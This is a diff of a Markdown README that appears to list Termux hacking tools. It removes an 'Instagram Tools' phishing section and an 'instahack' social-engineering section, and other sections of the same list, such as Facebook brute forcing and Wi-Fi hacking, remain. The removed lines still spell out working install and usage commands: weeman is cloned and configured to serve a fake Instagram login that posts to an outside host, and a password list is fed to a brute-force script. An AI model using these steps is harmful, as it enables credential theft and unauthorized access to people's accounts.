@@ -389,30 +389,6 @@ python2 fbbrute.py
 
 ## Instagram Tools
 
-### Phishing Instagram
-
-**Installation**
-
-```bash
-pkg update
-pkg upgrade
-pkg install python2
-pkg install git
-clear
-git clone https://github.com/evait-secutiry/weeman.git
-```
-
-**Usage**
-
-```bash
-cd weeman
-python2 weeman.py
-show
-set url http://dewopanel.host22.com/masuk.php
-set port 8080
-set action_url http://dewopanel.host22.com/masuk.php
-run
-```
 
 ### Instagram Follower & Like Bot
 
@@ -436,27 +412,6 @@ pip2 install -r requirements.txt
 bash instabot
 ```
 
-### Hack Instagram (Social Engineering)
-
-**Installation**
-
-```bash
-apt update && apt upgrade
-pkg install python
-pkg install git
-pkg install nano
-git clone https://github.com/avramit/instahack.git
-```
-
-**Usage**
-
-```bash
-cd instahack
-pip install requests
-nano pass.txt
-cat pass.txt
-python hackinsta.py
-```
 
 ## Wi-Fi Hacking (Root Required)
 
